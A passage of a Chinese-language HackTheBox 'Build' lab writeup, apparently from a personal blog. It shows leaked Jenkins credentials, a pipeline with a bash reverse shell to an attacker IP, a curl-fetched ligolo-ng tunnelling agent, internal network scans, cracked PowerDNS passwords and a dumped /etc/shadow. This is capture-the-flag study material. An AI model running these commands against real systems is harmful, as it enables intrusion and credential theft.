class="line">usernameSecret: <span class="literal">false</span></span><br><span class="line"><span class="built_in">id</span>: e4048737-7acd-46fd-86ef-a3db45683d4f</span><br><span class="line">username: buildadm</span><br><span class="line">password: Git1234!</span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span>: admin</span><br><span class="line">name: admin</span><br><span class="line">passwordHash: <span class="comment">#jbcrypt:$2a$10$PaXdGyit8MLC9CEPjgw15.6x0GOIZNAk2gYUTdaOB6NN/9CPcvYrG</span></span><br></pre></td></tr></table></figure>
+
+<p><a data-fancybox="gallery" data-src="/images/build-6.png" data-caption=""><img src="/images/build-6.png"></a></p>
+<p>试一下</p>
+<p><a data-fancybox="gallery" data-src="/images/build-7.png" data-caption=""><img src="/images/build-7.png"></a></p>
+<p>成功登录，改一下这个sh看看可不可以弹shell</p>
+<p><a data-fancybox="gallery" data-src="/images/build-8.png" data-caption=""><img src="/images/build-8.png"></a></p>
+<p>改成了这样，然后半天没收到，然后就看到</p>
+<p><a data-fancybox="gallery" data-src="/images/build-9.png" data-caption=""><img src="/images/build-9.png"></a></p>
+<p>行吧，改一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pipeline &#123;</span><br><span class="line">    agent any</span><br><span class="line"></span><br><span class="line">    stages &#123;</span><br><span class="line">        stage(<span class="string">&#x27;Do nothing&#x27;</span>) &#123;</span><br><span class="line">            steps &#123;</span><br><span class="line">                sh <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">                    #!/usr/bin/env bash -l</span></span><br><span class="line"><span class="string">                    bash -i &gt;&amp; /dev/tcp/10.10.16.2/9001 0&gt;&amp;1</span></span><br><span class="line"><span class="string">                &#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>改成这样，然后还是不行，那直接请求本地的再加载吧<br>好消息，可以请求本地的文件了，坏消息，还是没弹过来<br>哦，姿势不对</p>
+<p><a data-fancybox="gallery" data-src="/images/build-10.png" data-caption=""><img src="/images/build-10.png"></a></p>
+<p>终于</p>
+<h2 id="Shell-As-Root（Container）"><a href="#Shell-As-Root（Container）" class="headerlink" title="Shell As Root（Container）"></a>Shell As Root（Container）</h2><h3 id="Fscan-enum-container-info"><a href="#Fscan-enum-container-info" class="headerlink" title="Fscan enum container info"></a>Fscan enum container info</h3><p>进去一看是root，遂大喜，然觉是瓮中之鳖</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# <span class="built_in">ls</span> -la /</span><br><span class="line"><span class="built_in">ls</span> -la /</span><br><span class="line">total 60</span><br><span class="line">drwxr-xr-x   1 root root 4096 May  9  2024 .</span><br><span class="line">drwxr-xr-x   1 root root 4096 May  9  2024 ..</span><br><span class="line">-rwxr-xr-x   1 root root    0 May  9  2024 .dockerenv</span><br><span class="line">lrwxrwxrwx   1 root root    7 Jan 10  2024 bin -&gt; usr/bin</span><br><span class="line">drwxr-xr-x   2 root root 4096 Dec  9  2023 boot</span><br><span class="line">drwxr-xr-x   5 root root  340 Aug  8 02:14 dev</span><br><span class="line">drwxr-xr-x   1 root root 4096 May  9  2024 etc</span><br><span class="line">drwxr-xr-x   2 root root 4096 Dec  9  2023 home</span><br><span class="line">lrwxrwxrwx   1 root root    7 Jan 10  2024 lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx   1 root root    9 Jan 10  2024 lib32 -&gt; usr/lib32</span><br><span class="line">lrwxrwxrwx   1 root root    9 Jan 10  2024 lib64 -&gt; usr/lib64</span><br><span class="line">lrwxrwxrwx   1 root root   10 Jan 10  2024 libx32 -&gt; usr/libx32</span><br><span class="line">drwxr-xr-x   2 root root 4096 Jan 10  2024 media</span><br><span class="line">drwxr-xr-x   2 root root 4096 Jan 10  2024 mnt</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jan 16  2024 opt</span><br><span class="line">dr-xr-xr-x 238 root root    0 Aug  8 02:14 proc</span><br><span class="line">drwxr-xr-x   3 root root 4096 May  2  2024 root</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jan 16  2024 run</span><br><span class="line">lrwxrwxrwx   1 root root    8 Jan 10  2024 sbin -&gt; usr/sbin</span><br><span class="line">drwxr-xr-x   2 root root 4096 Jan 10  2024 srv</span><br><span class="line">dr-xr-xr-x  13 root root    0 Aug  8 02:14 sys</span><br><span class="line">drwxrwxrwt   1 root root 4096 Aug  8 08:39 tmp</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jan 10  2024 usr</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jan 16  2024 var</span><br></pre></td></tr></table></figure>
+
+<p>传了一个linpeas上去，发现里面还有一个</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Contents of /etc/hosts:                                                                                                                                                                                             </span><br><span class="line">  127.0.0.1     localhost                                                                                                                                                                                           </span><br><span class="line">  ::1   localhost ip6-localhost ip6-loopback                                                                                                                                                                        </span><br><span class="line">  fe00::0       ip6-localnet                                                                                                                                                                                        </span><br><span class="line">  ff00::0       ip6-mcastprefix                                                                                                                                                                                     </span><br><span class="line">  ff02::1       ip6-allnodes                                                                                                                                                                                        </span><br><span class="line">  ff02::2       ip6-allrouters                                                                                                                                                                                      </span><br><span class="line">  172.18.0.3    5ac6c7d6fb8e    </span><br></pre></td></tr></table></figure>
+
+<p>传个扫描工具上去<br>这里用<a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan/releases/tag/v2.0.1">fscan</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">root@5ac6c7d6fb8e:/tmp# ./fscan -h 172.18.0.0/24</span><br><span class="line">./fscan -h 172.18.0.0/24         </span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /    │</span></span><br><span class="line"><span class="string">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span></span><br><span class="line"><span class="string">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │                                                                                                                                                                    </span></span><br><span class="line"><span class="string">└──────────────────────────────────────────────┘</span></span><br><span class="line"><span class="string">      Fscan Version: 2.0.1                                                                                </span></span><br><span class="line"><span class="string">                                                                                                          </span></span><br><span class="line"><span class="string">[3.4s]     已选择服务扫描模式                                                                             </span></span><br><span class="line"><span class="string">[3.4s]     开始信息扫描                                                                                   </span></span><br><span class="line"><span class="string">[3.4s]     CIDR范围: 172.18.0.0-172.18.0.255                                                              </span></span><br><span class="line"><span class="string">[3.4s]     generate_ip_range_full                                                                         </span></span><br><span class="line"><span class="string">[3.4s]     解析CIDR 172.18.0.0/24 -&gt; IP范围 172.18.0.0-172.18.0.255</span></span><br><span class="line"><span class="string">[3.4s]     最终有效主机数量: 256                                                                          </span></span><br><span class="line"><span class="string">[3.4s]     开始主机扫描                                                                                   </span></span><br><span class="line"><span class="string">[3.4s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync</span></span><br><span class="line"><span class="string">, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle</span></span><br><span class="line"><span class="string">[3.4s] [*] 目标 172.18.0.1      存活 (ICMP)</span></span><br><span class="line"><span class="string">[3.4s] [*] 目标 172.18.0.2      存活 (ICMP)</span></span><br><span class="line"><span class="string">[3.4s] [*] 目标 172.18.0.3      存活 (ICMP)          </span></span><br><span class="line"><span class="string">[3.4s] [*] 目标 172.18.0.4      存活 (ICMP)</span></span><br><span class="line"><span class="string">[3.4s] [*] 目标 172.18.0.5      存活 (ICMP)</span></span><br><span class="line"><span class="string">[3.4s] [*] 目标 172.18.0.6      存活 (ICMP)</span></span><br><span class="line"><span class="string">[6.4s]     存活主机数量: 6</span></span><br><span class="line"><span class="string">[6.4s]     有效端口数量: 233                                                                                                                                                                                        </span></span><br><span class="line"><span class="string">[6.5s] [*] 端口开放 172.18.0.1:873                                                                        </span></span><br><span class="line"><span class="string">[6.5s] [*] 端口开放 172.18.0.3:8080</span></span><br><span class="line"><span class="string">[6.6s] [*] 端口开放 172.18.0.1:22  </span></span><br><span class="line"><span class="string">[6.6s] [*] 端口开放 172.18.0.1:3306   </span></span><br><span class="line"><span class="string">[6.6s] [*] 端口开放 172.18.0.1:3000</span></span><br><span class="line"><span class="string">[6.6s] [*] 端口开放 172.18.0.2:3000</span></span><br><span class="line"><span class="string">[6.8s] [*] 端口开放 172.18.0.1:8081                  </span></span><br><span class="line"><span class="string">[6.8s] [*] 端口开放 172.18.0.4:3306</span></span><br><span class="line"><span class="string">[6.8s] [*] 端口开放 172.18.0.5:8081             </span></span><br><span class="line"><span class="string">[6.8s] [*] 端口开放 172.18.0.2:22</span></span><br><span class="line"><span class="string">[6.8s] [*] 端口开放 172.18.0.6:80               </span></span><br><span class="line"><span class="string">[6.8s]     扫描完成, 发现 11 个开放端口         </span></span><br><span class="line"><span class="string">[6.8s]     存活端口数量: 11                     </span></span><br><span class="line"><span class="string">[6.8s]     开始漏洞扫描                         </span></span><br><span class="line"><span class="string">[7.0s] [+] MySQL 172.18.0.4:3306 root           </span></span><br><span class="line"><span class="string">[7.1s] [*] 网站标题 http://172.18.0.6         状态码:302 长度:199    标题:Redirecting... 重定向地址: http://172.18.0.6/login                                                                                        </span></span><br><span class="line"><span class="string">[7.1s] [+] MySQL 172.18.0.1:3306 root           </span></span><br><span class="line"><span class="string">[7.2s] [+] Rsync服务 172.18.0.1:873 匿名访问成功 模块: backups                                            </span></span><br><span class="line"><span class="string">[7.4s] [*] 网站标题 http://172.18.0.5:8081    状态码:401 长度:55     标题:Unauthorized                    </span></span><br><span class="line"><span class="string">[7.5s] [*] 网站标题 http://172.18.0.1:8081    状态码:401 长度:55     标题:Unauthorized                    </span></span><br><span class="line"><span class="string">[7.5s] [*] 网站标题 http://172.18.0.6/login   状态码:200 长度:3837   标题:Log In - PowerDNS-Admin         </span></span><br><span class="line"><span class="string">[7.6s] [*] 网站标题 http://172.18.0.1:3000    状态码:200 长度:14000  标题:Gitea: Git with a cup of tea    </span></span><br><span class="line"><span class="string">[7.7s] [*] 网站标题 http://172.18.0.2:3000    状态码:200 长度:14000  标题:Gitea: Git with a cup of tea    </span></span><br><span class="line"><span class="string">[7.9s]     POC加载完成: 总共387个，成功387个，失败0个                                                     </span></span><br><span class="line"><span class="string">[8.6s] [*] 发现指纹 目标: http://172.18.0.2:3000    指纹: [Gitea简易Git服务]                              </span></span><br><span class="line"><span class="string">[8.9s] [*] 发现指纹 目标: http://172.18.0.1:3000    指纹: [Gitea简易Git服务]                              </span></span><br><span class="line"><span class="string">[9.5s] [*] 网站标题 http://172.18.0.3:8080    状态码:200 长度:108832 标题:Dashboard [Jenkins]                                                                                                                       </span></span><br><span class="line"><span class="string">[32.3s] [*] 发现指纹 目标: http://172.18.0.3:8080    指纹: [Jenkins] </span></span><br><span class="line"><span class="string">[1m1s]     扫描已完成: 17/17          </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Ligolo-ng-Tunnel-Setting"><a href="#Ligolo-ng-Tunnel-Setting" class="headerlink" title="Ligolo-ng Tunnel Setting"></a>Ligolo-ng Tunnel Setting</h3><p>看这个得需要上ligolo了</p>
+<p>Athena上有proxy端和agent端了，可以直接拖过来用一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 吧唧</span></span><br><span class="line">root@5ac6c7d6fb8e:/tmp# curl 10.10.16.3:8080/agent -o agent</span><br><span class="line">curl 10.10.16.3:8080/agent -o agent</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100 6324k  100 6324k    0     0  1477k      0  0:00:04  0:00:04 --:--:-- 1477k</span><br><span class="line"></span><br><span class="line">root@5ac6c7d6fb8e:/tmp# <span class="built_in">chmod</span> +x agent</span><br><span class="line"><span class="built_in">chmod</span> +x agent</span><br><span class="line">root@5ac6c7d6fb8e:/tmp# ./agent -connect 10.10.16.3:11601 -ignore-cert</span><br><span class="line">./agent -connect 10.10.16.3:11601 -ignore-cert</span><br><span class="line"><span class="keyword">time</span>=<span class="string">&quot;2025-08-12T01:05:48Z&quot;</span> level=warning msg=<span class="string">&quot;warning, certificate validation disabled&quot;</span></span><br><span class="line"><span class="keyword">time</span>=<span class="string">&quot;2025-08-12T01:05:48Z&quot;</span> level=info msg=<span class="string">&quot;Connection established&quot;</span> addr=<span class="string">&quot;10.10.16.3:11601&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 公鸡</span></span><br><span class="line">╰─# ./proxy -selfcert                                                                                                                                                                                           1 ↵</span><br><span class="line">INFO[0000] Loading configuration file ligolo-ng.yaml     </span><br><span class="line">WARN[0000] Using default selfcert domain <span class="string">&#x27;ligolo&#x27;</span>, beware of CTI, SOC and IoC! </span><br><span class="line">INFO[0000] Listening on 0.0.0.0:11601                    </span><br><span class="line">INFO[0000] Starting Ligolo-ng Web, API URL is <span class="built_in">set</span> to: http://127.0.0.1:8080 </span><br><span class="line">WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy <span class="keyword">if</span> publicly exposed. </span><br><span class="line">    __    _             __                       </span><br><span class="line">   / /   (_)___ _____  / /___        ____  ____ _</span><br><span class="line">  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/                                                         </span><br><span class="line"> / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /                                                          </span><br><span class="line">/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  </span><br><span class="line">        /____/                          /____/   </span><br><span class="line">                                                     </span><br><span class="line">  Made <span class="keyword">in</span> France ♥            by @Nicocha30!         </span><br><span class="line">  Version: 0.8.2                                 </span><br><span class="line">                                                     </span><br><span class="line">ligolo-ng » INFO[0055] Agent joined.                                 <span class="built_in">id</span>=0242ac120003 name=root@5ac6c7d6fb8e remote=<span class="string">&quot;10.129.91.189:37498&quot;</span></span><br><span class="line">ligolo-ng »                    </span><br><span class="line">ligolo-ng » session</span><br><span class="line">? Specify a session : 1 - root@5ac6c7d6fb8e - 10.129.91.189:37498 - 0242ac120003</span><br><span class="line">[Agent : root@5ac6c7d6fb8e] » interface_create --name <span class="string">&quot;wansh&quot;</span></span><br><span class="line">INFO[0142] Creating a new wansh interface...             </span><br><span class="line">INFO[0142] Interface created!               </span><br><span class="line">[Agent : root@5ac6c7d6fb8e] » route_add --name wansh --route 172.18.0.0/24</span><br><span class="line">INFO[0261] Route created.           </span><br><span class="line">[Agent : root@5ac6c7d6fb8e] » start --tun wansh</span><br><span class="line">INFO[0311] Starting tunnel to root@5ac6c7d6fb8e (0242ac120003) </span><br><span class="line">[Agent : root@5ac6c7d6fb8e] » ifconfig</span><br><span class="line">┌─────────────────────────────────────┐</span><br><span class="line">│ Interface 0                         │</span><br><span class="line">├──────────────┬─────────────────────┤</span><br><span class="line">│ Name         │ lo                  │</span><br><span class="line">│ Hardware MAC │                     │</span><br><span class="line">│ MTU          │ 65536               │</span><br><span class="line">│ Flags        │ up|loopback|running │</span><br><span class="line">│ IPv4 Address │ 127.0.0.1/8         │</span><br><span class="line">└──────────────┴─────────────────────┘</span><br><span class="line">┌────────────────────────────────────────────────┐</span><br><span class="line">│ Interface 1                                    │</span><br><span class="line">├──────────────┬────────────────────────────────┤</span><br><span class="line">│ Name         │ eth0                           │</span><br><span class="line">│ Hardware MAC │ 02:42:ac:12:00:03              │</span><br><span class="line">│ MTU          │ 1500                           │</span><br><span class="line">│ Flags        │ up|broadcast|multicast|running │</span><br><span class="line">│ IPv4 Address │ 172.18.0.3/16                  │</span><br><span class="line">└──────────────┴────────────────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<p><a data-fancybox="gallery" data-src="/images/build-11.png" data-caption=""><img src="/images/build-11.png"></a></p>
+<h3 id="Change-DNS-Records-And-Rsh-Login"><a href="#Change-DNS-Records-And-Rsh-Login" class="headerlink" title="Change DNS Records And Rsh Login"></a>Change DNS Records And Rsh Login</h3><p>然后就是我们没有用户名和密码，还好有数据库可以root</p>
+<p><a data-fancybox="gallery" data-src="/images/build-12.png" data-caption=""><img src="/images/build-12.png"></a></p>
+<p><a data-fancybox="gallery" data-src="/images/build-13.png" data-caption=""><img src="/images/build-13.png"></a></p>
+<p>有一个hash，拿下来解一下</p>
+<p><a data-fancybox="gallery" data-src="/images/build-14.png" data-caption=""><img src="/images/build-14.png"></a></p>
+<p>直接<code>admin:winston</code>就可以登录上去了，也不用otp</p>
+<p><a data-fancybox="gallery" data-src="/images/build-15.png" data-caption=""><img src="/images/build-15.png"></a></p>
+<p>看一下现有的dns记录</p>
+<p><a data-fancybox="gallery" data-src="/images/build-16.png" data-caption=""><img src="/images/build-16.png"></a></p>
+<p>全改一下登录试试</p>
+<p><a data-fancybox="gallery" data-src="/images/build-17.png" data-caption=""><img src="/images/build-17.png"></a></p>
+<h2 id="Shell-As-Root-LocalMachine"><a href="#Shell-As-Root-LocalMachine" class="headerlink" title="Shell As Root(LocalMachine)"></a>Shell As Root(LocalMachine)</h2><h3 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T<span class="variable">$IBcAYFAKAV9</span>.4/2.9610b0<span class="variable">$Hair</span>.NYFJNHQiulYwquIniJ8qvRU6iPSuZd.ppbiyf/:20193:0:99999:7:::</span><br><span class="line">daemon:*:19579:0:99999:7:::</span><br><span class="line">bin:*:19579:0:99999:7:::</span><br><span class="line">sys:*:19579:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19579:0:99999:7:::</span><br><span class="line">games:*:19579:0:99999:7:::</span><br><span class="line">man:*:19579:0:99999:7:::</span><br><span class="line">lp:*:19579:0:99999:7:::</span><br><span class="line">mail:*:19579:0:99999:7:::</span><br><span class="line">news:*:19579:0:99999:7:::</span><br><span class="line">uucp:*:19579:0:99999:7:::</span><br><span class="line">proxy:*:19579:0:99999:7:::</span><br><span class="line">www-data:*:19579:0:99999:7:::</span><br><span class="line">backup:*:19579:0:99999:7:::</span><br><span class="line">list:*:19579:0:99999:7:::</span><br><span class="line">irc:*:19579:0:99999:7:::</span><br><span class="line">gnats:*:19579:0:99999:7:::</span><br><span class="line">nobody:*:19579:0:99999:7:::</span><br><span class="line">_apt:*:19579:0:99999:7:::</span><br><span class="line">systemd-network:*:19579:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19579:0:99999:7:::</span><br><span class="line">messagebus:*:19579:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19579:0:99999:7:::</span><br><span class="line">pollinate:*:19579:0:99999:7:::</span><br><span class="line">sshd:*:19579:0:99999:7:::</span><br><span class="line">syslog:*:19579:0:99999:7:::</span><br><span class="line">uuidd:*:19579:0:99999:7:::</span><br><span class="line">tcpdump:*:19579:0:99999:7:::</span><br><span class="line">tss:*:19579:0:99999:7:::</span><br><span class="line">landscape:*:19579:0:99999:7:::</span><br><span class="line">fwupd-refresh:*:19579:0:99999:7:::</span><br><span class="line">usbmux:*:19844:0:99999:7:::</span><br><span class="line">devops:$6$6jWynhTdaHzix4aZ<span class="variable">$KOp2qrR2eBn0A9YtIGEerosk8EP</span>/n9UV9tdY4K/DiG6FuDb2X2smCCs2fqS0i1ZVZeR51Q4yGylFT2jJm9Rke/:19844:0:99999:7:::</span><br><span class="line">lxd:!:19844::::::</span><br><span class="line">_laurel:!:20292::::::</span><br></pre></td></tr></table></figure>
+
+<h3 id="题外闲话"><a href="#题外闲话" class="headerlink" title="题外闲话"></a>题外闲话</h3><p>之前领导让研究一下搭一个满足需求的DNS服务器，尝试了bind9+webadmin和powerdns+powerdnsadmin，后来就半途而废了<br><a data-fancybox="gallery" data-src="/images/build-18.png" data-caption=""><img src="/images/build-18.png"></a></p>
+<p>感觉自己弄得肯定是不如人家团队搞得，到时候往上一架一用完蛋，出了问题直接走人 -<em>-<br>有时间还是稍微研究一下 -</em>-</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li>
+        
+          <li><a href="https://n0nome.github.io/tags/random/">random</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Rsync-info-enum"><span class="toc-number">1.1.</span> <span class="toc-text">Rsync info enum</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jenkins-Hash-Crack"><span class="toc-number">1.2.</span> <span class="toc-text">Jenkins Hash Crack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Root%EF%BC%88Container%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">Shell As Root（Container）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fscan-enum-container-info"><span class="toc-number">2.1.</span> <span class="toc-text">Fscan enum container info</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ligolo-ng-Tunnel-Setting"><span class="toc-number">2.2.</span> <span class="toc-text">Ligolo-ng Tunnel Setting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Change-DNS-Records-And-Rsh-Login"><span class="toc-number">2.3.</span> <span class="toc-text">Change DNS Records And Rsh Login</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Root-LocalMachine"><span class="toc-number">3.</span> <span class="toc-text">Shell As Root(LocalMachine)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashes"><span class="toc-number">3.1.</span> <span class="toc-text">Hashes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E5%A4%96%E9%97%B2%E8%AF%9D"><span class="toc-number">3.2.</span> <span class="toc-text">题外闲话</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/08/12/Build/Build/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/08/12/Build/Build/&text=HackTheBox--HTB Build Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/08/12/Build/Build/&title=HackTheBox--HTB Build Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/08/12/Build/Build/&is_video=false&description=HackTheBox--HTB Build Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox--HTB Build Writeup&body=Check out this article: https://n0nome.github.io/2025/08/12/Build/Build/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/08/12/Build/Build/&title=HackTheBox--HTB Build Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/08/12/Build/Build/&title=HackTheBox--HTB Build Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/08/12/Build/Build/&title=HackTheBox--HTB Build Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/08/12/Build/Build/&title=HackTheBox--HTB Build Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/08/12/Build/Build/&name=HackTheBox--HTB Build Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
